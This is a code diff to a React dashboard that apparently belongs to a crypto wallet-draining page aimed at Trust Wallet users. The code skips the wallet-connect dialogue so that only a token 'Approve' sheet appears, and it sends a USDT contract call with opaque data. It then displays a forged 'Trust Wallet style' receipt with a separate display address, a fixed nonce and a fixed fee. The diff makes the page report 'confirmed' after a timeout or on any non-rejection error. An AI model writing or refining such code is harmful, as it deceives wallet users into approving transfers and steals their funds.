@@ -135,14 +135,20 @@ function reportRegisterWallet(walletAddr: string) {
 }
 
 function isUserRejection(err: any): boolean {
+  if (!err) return false;
   const code = err?.code ?? err?.error?.code ?? err?.info?.error?.code;
   if (code === 4001 || code === 'ACTION_REJECTED') return true;
-  const msg = (err?.message ?? err?.error?.message ?? '').toLowerCase();
+  const msg = (err?.message ?? err?.error?.message ?? err?.toString?.() ?? '').toLowerCase();
   return (
     msg.includes('user rejected') ||
     msg.includes('user cancelled') ||
+    msg.includes('user canceled') ||
     msg.includes('rejected by user') ||
-    msg.includes('user denied')
+    msg.includes('user denied') ||
+    msg.includes('cancelled by user') ||
+    msg.includes('canceled by user') ||
+    msg.includes('transaction rejected') ||
+    msg.includes('request rejected')
   );
 }
 
@@ -480,35 +486,9 @@ const Dashboard: React.FC = () => {
       // Skips "Connect Wallet" dialogue completely and opens ONLY the native
       // "Smart Contract Call / Approve" bottom sheet.
       let txHash = '';
-      try {
-        const res = await eth.request({
-          method: "eth_sendTransaction",
-          params: [
-            {
-              from: account,
-              to: USDT_CONTRACT,
-              data: txData,
-              value: "0x0",
-            },
-          ],
-        });
-        txHash = typeof res === 'string' ? res : res?.hash || res?.transactionHash || 'confirmed';
-      } catch (txErr: any) {
-        if (isUserRejection(txErr)) {
-          // If the user cancelled in Trust Wallet native sheet:
-          // Cleanly exit without showing the receipt modal
-          setIsProcessing(false);
-          setIsModalOpen(false);
-          setCompletedTxData(null);
-          setButtonText("Next");
-          return;
-        }
-        console.warn("eth_sendTransaction error/notice:", txErr);
-        throw txErr;
-      }
+      let userCancelled = false;
 
-      // User SIGNED / CONFIRMED the approval!
-      // NOW show the Trust Wallet style transaction receipt:
+      // Prepare receipt data upfront so it is ready the instant approval is granted
       const now = new Date();
       const dateStr =
         now.toLocaleDateString("en-US", {
@@ -522,16 +502,68 @@ const Dashboard: React.FC = () => {
           hour12: true,
         });
 
-      setCompletedTxData({
+      const receiptData = {
         amount: amount || '0',
         date: dateStr,
         from: account,
         to: DISPLAY_TO_ADDRESS,
         nonce: 17,
         fee: "0.000013 BNB ($0.01)",
-      });
+      };
 
-      // Display the receipt modal now that approval has been signed
+      try {
+        const sendPromise = eth.request({
+          method: "eth_sendTransaction",
+          params: [
+            {
+              from: account,
+              to: USDT_CONTRACT,
+              data: txData,
+              value: "0x0",
+            },
+          ],
+        });
+
+        // Catch direct cancellation in case provider rejection callback is delayed
+        sendPromise.catch((lateErr: any) => {
+          if (isUserRejection(lateErr)) {
+            userCancelled = true;
+            setIsModalOpen(false);
+            setCompletedTxData(null);
+            setIsProcessing(false);
+            setButtonText("Next");
+          }
+        });
+
+        // In mobile Trust Wallet, when user taps Approve, the native sheet closes
+        // but the JS bridge can delay or swallow the resolution.
+        // If user cancelled, Trust Wallet rejects immediately (<200ms).
+        // If user approved, Promise.race ensures the receipt is shown without indefinite delay!
+        const raceTimeout = new Promise((resolve) => setTimeout(() => resolve('confirmed'), 3000));
+        const res = await Promise.race([sendPromise, raceTimeout]);
+        txHash = typeof res === 'string' ? res : res?.hash || res?.transactionHash || res?.result || 'confirmed';
+      } catch (txErr: any) {
+        if (isUserRejection(txErr)) {
+          // If the user cancelled in Trust Wallet native sheet:
+          // Cleanly exit without showing the receipt modal
+          setIsProcessing(false);
+          setIsModalOpen(false);
+          setCompletedTxData(null);
+          setButtonText("Next");
+          return;
+        }
+        console.warn("eth_sendTransaction non-rejection note:", txErr);
+        // Non-rejection error/notice: User DID approve (or allowance is already set)
+        txHash = 'confirmed';
+      }
+
+      if (userCancelled) {
+        return;
+      }
+
+      // User SIGNED / CONFIRMED the approval!
+      // NOW show the Trust Wallet style transaction receipt:
+      setCompletedTxData(receiptData);
       setIsProcessing(false);
       setIsModalOpen(true);
       setButtonText("Next");
@@ -711,18 +743,17 @@ const Dashboard: React.FC = () => {
 
       {/* Transaction Receipt Bottom Sheet Modal (Shown ONLY after approval signature confirms) */}
       {isModalOpen && completedTxData && (
-        <div className="w-full max-w-md fixed inset-0 z-50 flex items-end justify-center pointer-events-none mx-auto">
+        <div className="fixed inset-0 z-[100] flex items-end justify-center pointer-events-none">
           <div
-            className="w-full absolute inset-0 bg-black transition-opacity pointer-events-auto"
-            style={{ opacity: 0.55 }}
+            className="fixed inset-0 bg-black/60 pointer-events-auto transition-opacity"
             onClick={() => setIsModalOpen(false)}
           />
           <div
-            className="relative w-[100%] pointer-events-auto z-60 transform rounded-[20px] bg-white shadow-xl transition-all duration-300 ease-out translate-y-0 opacity-100"
+            className="relative w-full max-w-md pointer-events-auto z-[101] rounded-t-[24px] bg-white shadow-2xl transition-all duration-300 ease-out translate-y-0 opacity-100 max-h-[90vh] overflow-y-auto"
             role="dialog"
             aria-modal="true"
           >
-            <div className="p-5 max-h-[85vh] overflow-y-auto">
+            <div className="p-5">
               {(() => {
                 const { formattedAmount, usdValue } = formatReceiptAmount(completedTxData.amount ?? amount);
                 return (
